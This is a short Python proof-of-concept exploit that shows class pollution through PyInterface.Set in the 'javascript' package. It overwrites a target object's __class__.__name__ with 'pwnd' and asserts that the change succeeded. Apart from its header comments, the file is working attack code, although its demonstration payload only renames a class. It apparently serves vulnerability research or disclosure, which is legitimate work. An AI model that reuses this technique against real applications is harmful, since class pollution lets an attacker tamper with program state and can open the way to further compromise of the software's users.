# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: PyInterface.Set
# Type: get-attr-set-attr

from javascript.pyi import PyInterface

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = ("__name__", payload_value)

def run_poc():
  iface = PyInterface.__new__(PyInterface)
  iface.m = {0: target}
  iface.cur_ffid = 0
  iface.q = lambda *a: None
  iface.Set(None, 0, ["__class__"], PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
